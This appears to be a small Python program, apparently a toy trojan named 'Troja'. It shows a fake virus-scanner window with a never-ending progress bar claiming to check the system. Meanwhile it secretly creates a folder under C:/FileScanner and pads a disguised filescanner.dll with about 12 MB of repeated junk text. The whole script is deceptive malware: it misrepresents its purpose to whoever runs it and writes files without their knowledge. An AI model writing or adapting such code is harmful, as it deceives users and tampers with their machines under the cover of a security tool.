import tkinter as tk
import threading
from time import sleep
import os
from PIL import ImageTk, Image
import tkinter.ttk as ttk

class App(threading.Thread):

	def __init__(self):
		threading.Thread.__init__(self)
		self.start()

	def BC(self):
		self.root.quit()
	
	def run(self):
		self.root = tk.Tk()
		self.root.protocol("WM_DELETE_WINDOW", self.BC)
		self.root.wm_title("TROJA SCANER")
		imag = ImageTk.PhotoImage(Image.open("Troja.png"))
		panel = tk.Label(self.root, image = imag)
		panel.pack(side = "top", fill = "both", expand = "yes")
		F = tk.Text(self.root, height=2, width=70)
		F.pack()
		F.insert("1.0", "Checking for any virus in the system\n")
		pb = ttk.Progressbar(self.root, orient="horizontal", length=1000, mode="determinate")
		pb.pack(side="bottom")
		pb.start()
		self.root.mainloop()
		
app = App()

if os.path.exists("C:/FileScanner/Important") == False:
	os.mkdir("C:/FileScanner")
	os.chdir("C:/FileScanner")
	os.mkdir("C:/FileScanner/Important")

for i in range(30):
	myfile = open("C:/FileScanner/Important/filescanner.dll", "a")
	sleep(2)
	for j in range(30000):
		myfile.write("appended text")
	myfile.close()





